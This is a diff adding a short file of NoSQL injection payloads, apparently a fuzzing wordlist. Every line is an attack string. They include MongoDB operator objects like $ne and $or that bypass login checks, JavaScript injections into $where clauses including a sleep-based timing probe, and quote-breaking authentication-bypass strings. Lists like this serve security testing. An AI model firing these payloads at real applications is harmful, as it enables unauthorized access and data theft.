@@ -1,0 +1,11 @@
+' "
+;return true;
+{"$ne": null}
+{"$gt": ""}
+{"$where": "sleep(5000)"}
+admin' || '1'=='1
+'||1==1//
+{"$ne": 1}
+';return 'a'=='a' && ''=='
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"$or": [{}, {"a":"a"}]}
